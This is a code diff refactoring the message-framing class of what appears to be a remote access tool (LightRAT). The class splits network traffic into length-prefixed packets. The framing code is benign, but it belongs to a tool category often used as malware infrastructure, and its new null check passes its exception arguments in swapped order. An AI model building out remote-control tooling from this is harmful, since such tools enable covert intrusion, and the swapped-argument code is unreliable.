@@ -7,12 +7,12 @@ namespace LightRAT.Core.Network.Protocol
 {
     public class MessageFramingProtocol
     {
+        private int receivedData = 0;
         private byte[] bufferLength = BitConverter.GetBytes(sizeof(int));
         private ReceivingMode receivingMode = ReceivingMode.Header;
+
         private byte[] buffer;
         private int _maxBufferLength;
-        private int receivedData = 0;
-
         public event Action<byte[]> DataReceivedEvent;
 
         public MessageFramingProtocol(int maxBufferLength)
@@ -30,7 +30,7 @@ namespace LightRAT.Core.Network.Protocol
                 readingBufferHolder = bufferLength;
                 dataLength = bufferLength.Length;
             }
-            if (receivingMode == ReceivingMode.Packet)
+            else
             {
                 readingBufferHolder = buffer;
 
@@ -45,14 +45,13 @@ namespace LightRAT.Core.Network.Protocol
             // if not we read after the header
             int readingOffset = (buffer == null || (receivedData != data.Length && receivedData > 0)) ? 0 : bufferLength.Length;
 
-            // Array.Copy(data, readingOffset, readingBufferHolder, 0, dataLength);
             using (var bufferMemoryStream = new MemoryStream(readingBufferHolder))
-                using (var dataMemoryStream = new MemoryStream(data, readingOffset, dataLength))
-                    dataMemoryStream.CopyTo(bufferMemoryStream);
+                using (var dataMemoryStream = new MemoryStream(data, readingOffset, dataLength, false))
+                    dataMemoryStream.WriteTo(bufferMemoryStream);
 
-            ReadCompeleted(dataLength, data);
+            ReadCompeleted(dataLength, ref data);
         }
-        private void ReadCompeleted(int dataLength, byte[] data)
+        private void ReadCompeleted(int dataLength, ref byte[] data)
         {
 
             if (receivingMode == ReceivingMode.Header)
@@ -84,7 +83,7 @@ namespace LightRAT.Core.Network.Protocol
             }
         }
 
-        public void Reset()
+        private void Reset()
         {
             buffer = null;
             bufferLength = BitConverter.GetBytes(sizeof(int));
@@ -93,10 +92,19 @@ namespace LightRAT.Core.Network.Protocol
         }
         public static byte[] Frame(byte[] data)
         {
+            if (data == null)
+                throw new ArgumentNullException("the data cannot be null", nameof(data));
+
             byte[] lengthInBytes = BitConverter.GetBytes(data.Length);
             byte[] framedData = new byte[lengthInBytes.Length + data.Length];
-            Array.Copy(lengthInBytes, framedData, lengthInBytes.Length);
-            Array.Copy(data, 0, framedData, lengthInBytes.Length, data.Length);
+            using (var frameDataMS = new MemoryStream(framedData))
+            {
+                using (var lengthMS = new MemoryStream(lengthInBytes))
+                    lengthMS.WriteTo(frameDataMS);
+
+                using (var dataMS = new MemoryStream(data))
+                    dataMS.WriteTo(frameDataMS);
+            }
             return framedData;
         }
     }
